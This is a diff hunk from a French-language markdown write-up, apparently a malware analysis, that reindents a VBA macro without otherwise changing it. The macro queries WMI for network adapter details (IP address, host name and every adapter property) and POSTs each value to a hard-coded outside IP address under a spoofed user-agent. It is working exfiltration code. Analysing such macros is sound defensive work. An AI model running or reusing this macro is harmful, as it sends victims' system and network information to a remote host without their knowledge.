@@ -32,36 +32,36 @@ Quand on a fait toutes les sous-étapes précédente on peut voir et comprendre 
 
 ```=macro
 Sub WMI()
-sWQL = "Select * From Win32_NetworkAdapterConfiguration"
-Set var_01 = GetObject("winmgmts:root/CIMV2")
-Set var_02 = var_01.ExecQuery(sWQL)
-Set var_03 = CreateObject("MSXML2.ServerXMLHTTP")
-Url = "http://176.31.120.218:5000/thisis"
-Debug.Print Url
-For Each oWMIObjEx In var_02
-If Not IsNull(oWMIObjEx.IPAddress) Then
-Debug.Print "IP:"; oWMIObjEx.IPAddress(0)
-var_03.Open "POST", Url, True
-var_03.setRequestHeader "User-Agent", "Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00"
-var_03.send oWMIObjEx.IPAddress(0)
-Debug.Print "Host name:"; oWMIObjEx.DNSHostName
-For Each oWMIProp In oWMIObjEx.Properties_
-If IsArray(oWMIProp.Value) Then
-For n = LBound(oWMIProp.Value) To UBound(oWMIProp.Value)
-Debug.Print oWMIProp.Name & "()", oWMIProp.Value(n)
-var_03.Open "POST", Url, True
-var_03.setRequestHeader "User-Agent", "Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00"
-var_03.send oWMIProp.Value(n)
-Next
-Else
-Debug.Print oWMIProp.Name, oWMIProp.Value
-var_03.Open "POST", Url, True
-var_03.setRequestHeader "User-Agent", "Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00"
-var_03.send oWMIProp.Value
-End If
-Next
-End If
-Next
+    sWQL = "Select * From Win32_NetworkAdapterConfiguration"
+    Set var_01 = GetObject("winmgmts:root/CIMV2")
+    Set var_02 = var_01.ExecQuery(sWQL)
+    Set var_03 = CreateObject("MSXML2.ServerXMLHTTP")
+    Url = "http://176.31.120.218:5000/thisis"
+    Debug.Print Url
+    For Each oWMIObjEx In var_02
+        If Not IsNull(oWMIObjEx.IPAddress) Then
+        Debug.Print "IP:"; oWMIObjEx.IPAddress(0)
+        var_03.Open "POST", Url, True
+        var_03.setRequestHeader "User-Agent", "Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00"
+        var_03.send oWMIObjEx.IPAddress(0)
+        Debug.Print "Host name:"; oWMIObjEx.DNSHostName
+        For Each oWMIProp In oWMIObjEx.Properties_
+            If IsArray(oWMIProp.Value) Then
+                For n = LBound(oWMIProp.Value) To UBound(oWMIProp.Value)
+                    Debug.Print oWMIProp.Name & "()", oWMIProp.Value(n)
+                    var_03.Open "POST", Url, True
+                    var_03.setRequestHeader "User-Agent", "Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00"
+                    var_03.send oWMIProp.Value(n)
+                Next
+            Else
+                Debug.Print oWMIProp.Name, oWMIProp.Value
+                var_03.Open "POST", Url, True
+                var_03.setRequestHeader "User-Agent", "Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00"
+                var_03.send oWMIProp.Value
+            End If
+        Next
+        End If
+    Next
 End Sub
 ```
 
